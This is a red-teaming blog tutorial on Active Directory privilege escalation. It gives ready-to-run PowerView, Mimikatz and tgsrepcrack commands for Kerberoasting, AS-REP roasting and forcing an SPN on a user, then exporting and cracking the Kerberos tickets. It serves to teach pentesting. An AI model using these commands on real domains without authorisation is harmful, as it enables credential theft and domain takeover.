<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Active Directory - Domain Privilege Escalation" /><meta name="author" content="Bhaskar Pal" /><meta property="og:locale" content="en" /><meta name="description" content="Cyber security, Red Teaming and CTF Writeup’s" /><meta property="og:description" content="Cyber security, Red Teaming and CTF Writeup’s" /><link rel="canonical" href="https://0xstarlight.github.io/posts/Active-Directory-Domain-Priv-Esc/" /><meta property="og:url" content="https://0xstarlight.github.io/posts/Active-Directory-Domain-Priv-Esc/" /><meta property="og:site_name" content="0xStarlight" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-04-14T07:10:00+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Active Directory - Domain Privilege Escalation" /><meta name="twitter:site" content="@Bhaskarpal__" /><meta name="twitter:creator" content="@Bhaskar Pal" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Bhaskar Pal"},"dateModified":"2022-04-14T07:10:00+05:30","datePublished":"2022-04-14T07:10:00+05:30","description":"Cyber security, Red Teaming and CTF Writeup’s","headline":"Active Directory - Domain Privilege Escalation","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xstarlight.github.io/posts/Active-Directory-Domain-Priv-Esc/"},"url":"https://0xstarlight.github.io/posts/Active-Directory-Domain-Priv-Esc/"}</script><title>Active Directory - Domain Privilege Escalation | 0xStarlight</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="0xStarlight"><meta name="application-name" content="0xStarlight"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" https://avatars.githubusercontent.com/u/59029171 " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">0xStarlight</a></div><div class="site-subtitle font-italic">Cyber security, Red Teaming and CTF Writeup's</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/0xStarlight" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/Bhaskarpal__" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['Bhaskarpal347','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Active Directory - Domain Privilege Escalation</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Active Directory - Domain Privilege Escalation</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/Bhaskarpal__">Bhaskar Pal</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1649900400" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-04-14 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2338 words"> <em>12 min</em> read</span></div></div></div><div class="post-content"><p><img data-src="https://user-images.githubusercontent.com/59029171/163324875-6a0f3bd3-7e7a-4926-82d8-e36569f1b92c.png" alt="image" data-proofer-ignore></p><h1 id="introduction"><span style="color:lightblue">Introduction</span></h1><p>Welcome to my sixth article in the Red Teaming Series (Active Directory Domain Privilege Escalation). I hope everyone has gone through the previous articles of this series which go through the basic concepts required, high-level Domain enumeration explanation, AD/Windows Local Privilege escalation guide, AD Lateral Movement and Domain Persistence.</p><p>If not so, you can give it a read from <a href="https://0xstarlight.github.io/categories/red-teaming/">here</a>.</p><p>This guide explains Active-Directory Domain Privilege Escalation mainly by Kerberos, AS-REPs, Set-SPN, and Kerberos Delegation. I will also explain those terms that every pentester/red-teamer should control to understand the attacks performed in an Active Directory network. You may refer to this as a Cheat-Sheet also.</p><p>I will continue to update this article with new Domain Privilege Escalation Methods.</p><blockquote><h2 id="throughout-the-article-i-will-use-powerviewps1-and-invoke-mimikatz-in-performing-the-privilege-escalation-on-a-windowsactive-directory-domain-if-any-other-tools-are-required-they-will-be-mentioned-at-the-end"><span class="mr-2">Throughout the article, I will use <a href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1"><span class="mr-2">powerview.ps1</a> and <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1"><span class="mr-2">Invoke-Mimikatz</a> in performing the Privilege Escalation on a Windows/Active Directory Domain. If any other tools are required, they will be mentioned at the end.</span><a href="#throughout-the-article-i-will-use-powerviewps1-and-invoke-mimikatz-in-performing-the-privilege-escalation-on-a-windowsactive-directory-domain-if-any-other-tools-are-required-they-will-be-mentioned-at-the-end" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2></blockquote><h1 id="kerberost"><span style="color:lightblue">Kerberost</span></h1><ul><li>Offline cracking of service account passwords.<li>The Kerberos session ticket (TGS) has a server portion which is encrypted with the password hash of service account. This makes it possible to request a ticket and do offline password attack.<li>Service accounts are many times ignored (passwords are rarely changed) and have privileged access.<li>Password hashes of service accounts could be used to create Silver tickets.</ul><h2 id="methodologysteps"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Methodology/Steps</span></span><a href="#methodologysteps" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ul class="task-list"><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />1. First find all the SPN accounts<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />2. Select SPN of a domain admin since we doing privilege escalation<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />3. Set the SPN as the argumentlist value and create a new object ( request a TGS )<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />4. Export the all the tickets by mimikatz<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />5. Keep a note of the file name where the ticket is stored of that service<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />6. Crack the ticket</ul><h2 id="powerview"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">PowerView</span></span><a href="#powerview" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="1-find-user-accounts-used-as-service-account"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">1. Find user accounts used as Service account</span></span><a href="#1-find-user-accounts-used-as-service-account" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">Get-NetUser</span><span class="w"> </span><span class="nt">-SPN</span><span class="w">
</span><span class="n">Get-NetUser</span><span class="w"> </span><span class="nt">-SPN</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">displayname</span><span class="p">,</span><span class="nx">memberof</span><span class="w">
</span></pre></table></code></div></div><h2 id="cmdlet"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Cmdlet</span></span><a href="#cmdlet" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="2-request-tgs"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">2. Request TGS</span></span><a href="#2-request-tgs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">Add-Type</span><span class="w"> </span><span class="nt">-AssemblyName</span><span class="w"> </span><span class="nx">System.IdentityModel</span><span class="w">
</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.IdentityModel.Tokens.KerberosRequestorSecurityToken</span><span class="w"> </span><span class="nt">-ArgumentList</span><span class="w"> </span><span class="s2">"spn-name-here"</span><span class="w">
</span></pre></table></code></div></div><h3 id="3-check-if-the-tgs-has-been-granted"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">3. Check if the TGS has been granted</span></span><a href="#3-check-if-the-tgs-has-been-granted" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">klist</span><span class="w">
</span></pre></table></code></div></div><h2 id="invoke-mimikatz"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Invoke-Mimikatz</span></span><a href="#invoke-mimikatz" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="4-export-all-the-tickets"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">4. Export all the tickets</span></span><a href="#4-export-all-the-tickets" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"kerberos::list /export"'</span><span class="w">
</span></pre></table></code></div></div><h2 id="tgsrepcrack"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">tgsrepcrack</span></span><a href="#tgsrepcrack" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="5-crack-the-hash"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">5. Crack the Hash</span></span><a href="#5-crack-the-hash" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="go">python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\file-name-which-got-exported.kirbi
</span></pre></table></code></div></div><h1 id="as-reps"><span style="color:lightblue">AS-REPs</span></h1><ul><li>If a user’s <strong>UserAccountControl</strong> settings have “Do not require Kerberos preauthentication” enabled i.e. Kerberos preauth is disabled, it is possible to grab user’s crackable AS-REP and brute-force it offline.<li>With sufficient rights (<strong>GenericWrite</strong> or <strong>GenericAll</strong>), Kerberos preauth can be forced disabled as well.</ul><h2 id="methodologysteps-1"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Methodology/Steps</span></span><a href="#methodologysteps-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ul class="task-list"><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />1. Enumerate the users who don’t require Pre-auth<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />2. You can try to disable the Pre-auth requirement of a user is you have the Permissions required<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />3. Do a AS-REP request against the user and capture the hash<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />4. Use JTR to crack the hash</ul><h2 id="powerview-dev"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">PowerView Dev</span></span><a href="#powerview-dev" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="1-enumerate-users"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">1. Enumerate users</span></span><a href="#1-enumerate-users" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-DomainUser</span><span class="w"> </span><span class="nt">-PreauthNotRequired</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><h3 id="check-rdpusers-rights-on-acls-extra"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">Check RDPUsers rights on ACL’s (extra)</span></span><a href="#check-rdpusers-rights-on-acls-extra" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-ACLScanner</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityReferenceName</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"RDPUsers"</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><h3 id="disable-kerberos-preauth-extra"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">Disable Kerberos Preauth (extra)</span></span><a href="#disable-kerberos-preauth-extra" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Set-DomainObject</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">user</span><span class="err">&gt;</span><span class="w"> </span><span class="o">-XOR</span><span class="w"> </span><span class="p">@{</span><span class="nx">useraccountcontrol</span><span class="o">=</span><span class="mi">4194304</span><span class="p">}</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><h2 id="asreproast"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">ASREPRoast</span></span><a href="#asreproast" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="2-request-as-rep"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">2. Request AS-REP</span></span><a href="#2-request-as-rep" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-ASREPHash</span><span class="w"> </span><span class="nt">-UserName</span><span class="w"> </span><span class="nx">USER</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><h3 id="to-enumerate-all-users-with-kerberos-preauth-disabled-and-request-a-hash-extra"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">To enumerate all users with Kerberos preauth disabled and request a hash (extra)</span></span><a href="#to-enumerate-all-users-with-kerberos-preauth-disabled-and-request-a-hash-extra" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-ASREPRoast</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><h1 id="set-spn"><span style="color:lightblue">Set-SPN</span></h1><ul><li>With enough rights (<strong>GenericAll/GenericWrite</strong>), a target user’s SPN can be set to anything (<em>unique in the domain</em>).<li>We can then request a TGS without special privileges. The TGS can then be “Kerberoasted”.</ul><h2 id="methodologysteps-2"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Methodology/Steps</span></span><a href="#methodologysteps-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ul class="task-list"><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />1. Search all the members who have the specific group required on ACL’s; In this case RDPUsers<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />2. Check if the SPN does not already exist<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />3. If not create a unique SPN for that account<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />4. Request a TGS<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />5. Export the tickets<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />6. Crack the file created of that service using JTR or tgsrepcrack</ul><h2 id="powerview-dev-1"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">PowerView Dev</span></span><a href="#powerview-dev-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="1-check-group-rights-on-acls"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">1. Check group rights on ACL’s</span></span><a href="#1-check-group-rights-on-acls" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-ACLScanner</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityReferenceName</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"RDPUsers"</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><h3 id="2-check-if-the-user-already-has-a-spn"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">2. Check if the user already has a SPN</span></span><a href="#2-check-if-the-user-already-has-a-spn" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-DomainUser</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">user-here</span><span class="err">&gt;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">serviceprincipalname</span><span class="w">
</span></pre></table></code></div></div><h3 id="3-set-a-spn-for-the-user-must-be-unique-for-the-domain"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">3. Set a SPN for the user (must be unique for the domain)</span></span><a href="#3-set-a-spn-for-the-user-must-be-unique-for-the-domain" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Set-DomainoObject</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">user-here</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Set</span><span class="w"> </span><span class="p">@{</span><span class="nx">serviceprincipalname</span><span class="o">=</span><span class="s1">'ops/whatever1'</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><h2 id="cmdlet-1"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Cmdlet</span></span><a href="#cmdlet-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="4-request-tgs"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">4. Request TGS</span></span><a href="#4-request-tgs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">Add-Type</span><span class="w"> </span><span class="nt">-AssemblyName</span><span class="w"> </span><span class="nx">System.IdentityModel</span><span class="w">
</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.IdentityModel.Tokens.KerberosRequestorSecurityToken</span><span class="w"> </span><span class="nt">-ArgumentList</span><span class="w"> </span><span class="s2">"ops/whatever1"</span><span class="w">
</span></pre></table></code></div></div><h3 id="check-if-the-tgs-has-been-granted"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">Check if the TGS has been granted</span></span><a href="#check-if-the-tgs-has-been-granted" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">klist</span><span class="w">
</span></pre></table></code></div></div><h2 id="invoke-mimikatz-1"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Invoke-Mimikatz</span></span><a href="#invoke-mimikatz-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="5-export-all-the-tickets"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">5. Export all the tickets</span></span><a href="#5-export-all-the-tickets" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"kerberos::list /export"'</span><span class="w">
</span></pre></table></code></div></div><h3 id="get-hash-of-target-directly-extra"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">Get hash of target directly (extra)</span></span><a href="#get-hash-of-target-directly-extra" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-DomainUser</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">user-here</span><span class="err">&gt;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Get-DomainSPNTicket</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nt">-ExpandProperty</span><span class="w"> </span><span class="nx">Hash</span><span class="w">
</span></pre></table></code></div></div><h2 id="tgsrepcrack-1"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">tgsrepcrack</span></span><a href="#tgsrepcrack-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="6-crack-the-hash"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">6. Crack the Hash</span></span><a href="#6-crack-the-hash" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="go">python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\file-name-which-got-exported.kirbi
